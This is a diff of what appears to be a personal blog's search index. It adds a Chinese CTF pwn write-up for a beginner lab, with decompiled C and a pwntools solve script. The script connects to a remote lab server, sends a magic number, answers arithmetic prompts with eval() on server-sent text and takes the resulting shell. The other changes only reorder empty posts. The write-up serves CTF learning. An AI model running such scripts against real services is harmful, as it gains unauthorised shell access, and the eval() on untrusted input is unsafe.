@@ -4,6 +4,27 @@
   
   
   <entry>
+    <title>SSS_CTF题解</title>
+    <link href="/SSS_CTF%E9%A2%98%E8%A7%A3/"/>
+    <url>/SSS_CTF%E9%A2%98%E8%A7%A3/</url>
+    
+    <content type="html"><![CDATA[<h1 id="SSS-CTF题解"><a href="#SSS-CTF题解" class="headerlink" title="SSS_CTF题解"></a>SSS_CTF题解</h1><h2 id="PWN入门部分"><a href="#PWN入门部分" class="headerlink" title="PWN入门部分"></a>PWN入门部分</h2><h3 id="Lab-0"><a href="#Lab-0" class="headerlink" title="Lab_0"></a>Lab_0</h3><h4 id="checksec"><a href="#checksec" class="headerlink" title="checksec:"></a>checksec:</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">briteny@localhost:/mnt/d/copy/Lab_0/Lab 0$ checksec pwntools<br>[*] &#x27;/mnt/d/copy/Lab_0/Lab 0/pwntools&#x27;<br>    Arch:       amd64-64-little<br>    RELRO:      Full RELRO<br>    Stack:      Canary found<br>    NX:         NX enabled<br>    PIE:        PIE enabled<br>    Stripped:   No<br></code></pre></td></tr></table></figure><h4 id="IDA-Pro："><a href="#IDA-Pro：" class="headerlink" title="IDA_Pro："></a>IDA_Pro：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> buf; <span class="hljs-comment">// [rsp+Ch] [rbp-24h] BYREF</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+10h] [rbp-20h] BYREF</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+14h] [rbp-1Ch]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> seed; <span class="hljs-comment">// [rsp+18h] [rbp-18h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v8; <span class="hljs-comment">// [rsp+1Ch] [rbp-14h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v9; <span class="hljs-comment">// [rsp+20h] [rbp-10h]</span><br>  <span class="hljs-type">int</span> v10; <span class="hljs-comment">// [rsp+24h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v11; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span><br><br>  v11 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  setvbuf(_bss_start, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  signal(<span class="hljs-number">14</span>, handler);<br>  alarm(<span class="hljs-number">0132u</span>);<br>  seed = time(<span class="hljs-number">0LL</span>);<br>  srand(seed);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Give me the magic number :)&quot;</span>);<br>  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">4uLL</span>);<br>  <span class="hljs-keyword">if</span> ( buf != <span class="hljs-number">-559038737</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Bye~&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Complete 1000 math questions in 90 seconds!!!&quot;</span>);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">999</span>; ++i )<br>  &#123;<br>    v8 = random() % <span class="hljs-number">0xFFFF</span>;<br>    v9 = random() % <span class="hljs-number">0xFFFF</span>;<br>    v10 = random() % <span class="hljs-number">3</span>;<br>    <span class="hljs-keyword">switch</span> ( v10 )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d - %d = ?&quot;</span>, v8, v9);<br>        __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v5);<br>        <span class="hljs-keyword">if</span> ( v8 - v9 != v5 )<br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Bye Bye~&quot;</span>);<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d * %d = ?&quot;</span>, v8, v9);<br>        __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v5);<br>        <span class="hljs-keyword">if</span> ( v9 * v8 != v5 )<br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Bye Bye~&quot;</span>);<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d + %d = ?&quot;</span>, v8, v9);<br>        __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v5);<br>        <span class="hljs-keyword">if</span> ( v9 + v8 != v5 )<br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Bye Bye~&quot;</span>);<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Good job!&quot;</span>);<br>  system(<span class="hljs-string">&quot;sh&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br><br>context(os=&#x27;linux&#x27;, arch=&#x27;i386&#x27; ,log_level=&#x27;debug&#x27;)<br><br>#p = process(&#x27;./pwntools&#x27;)<br>p = remote(&#x27;210.30.97.133&#x27;,28073)<br><br>payload1 = p32(3735928559)<br>p.recvuntil(b&#x27;Give me the magic number :)\n&#x27;)<br>p.send(payload1)<br>pause()<br>p.recvuntil(b&#x27;Complete 1000 math questions in 90 seconds!!!\n&#x27;)<br><br>for i in range(1000):<br>    expr = p.recvuntil(b&#x27; = ?&#x27;).replace(b&#x27; = ?&#x27;,b&#x27;&#x27;)<br>    print(expr)<br>    ans = eval(expr)<br>    p.sendline(str(ans))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>就是简单的将指定数字打包送入，再写循环解出对应的算式答案。</p><p><strong>注意的是，并不是64位的程序就对应p64打包，而是对应接受量的位数决定用什么打包，这里就是64位，但是打包是32位</strong></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>CTF_PWN</category>
+      
+      <category>Personal_wp</category>
+      
+    </categories>
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>厨艺学习记录</title>
     <link href="/%E5%8E%A8%E8%89%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
     <url>/%E5%8E%A8%E8%89%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
@@ -240,6 +261,25 @@
   
   
   <entry>
+    <title>数据库</title>
+    <link href="/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
+    <url>/%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
+    
+    <content type="html"><![CDATA[<h1 id="数据库-sql"><a href="#数据库-sql" class="headerlink" title="数据库 [ sql ]"></a>数据库 [ sql ]</h1>]]></content>
+    
+    
+    <categories>
+      
+      <category>大模型</category>
+      
+    </categories>
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>循环神经网络</title>
     <link href="/%E5%BE%AA%E7%8E%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/"/>
     <url>/%E5%BE%AA%E7%8E%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/</url>
@@ -252,25 +292,6 @@
       <category>大模型</category>
       
       <category>深度学习</category>
-      
-    </categories>
-    
-    
-  </entry>
-  
-  
-  
-  <entry>
-    <title>数据库</title>
-    <link href="/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
-    <url>/%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
-    
-    <content type="html"><![CDATA[<h1 id="数据库-sql"><a href="#数据库-sql" class="headerlink" title="数据库 [ sql ]"></a>数据库 [ sql ]</h1>]]></content>
-    
-    
-    <categories>
-      
-      <category>大模型</category>
       
     </categories>
     
@@ -322,27 +343,6 @@
   
   
   <entry>
-    <title>神经网络基础</title>
-    <link href="/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/"/>
-    <url>/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/</url>
-    
-    <content type="html"><![CDATA[<h1 id="神经网络基础"><a href="#神经网络基础" class="headerlink" title="神经网络基础"></a>神经网络基础</h1>]]></content>
-    
-    
-    <categories>
-      
-      <category>大模型</category>
-      
-      <category>深度学习</category>
-      
-    </categories>
-    
-    
-  </entry>
-  
-  
-  
-  <entry>
     <title>机器学习_one</title>
     <link href="/%E7%9B%91%E7%9D%A3%E5%AD%A6%E4%B9%A0/"/>
     <url>/%E7%9B%91%E7%9D%A3%E5%AD%A6%E4%B9%A0/</url>
@@ -355,6 +355,27 @@
       <category>大模型</category>
       
       <category>机器学习</category>
+      
+    </categories>
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>神经网络基础</title>
+    <link href="/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/"/>
+    <url>/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/</url>
+    
+    <content type="html"><![CDATA[<h1 id="神经网络基础"><a href="#神经网络基础" class="headerlink" title="神经网络基础"></a>神经网络基础</h1>]]></content>
+    
+    
+    <categories>
+      
+      <category>大模型</category>
+      
+      <category>深度学习</category>
       
     </categories>
     
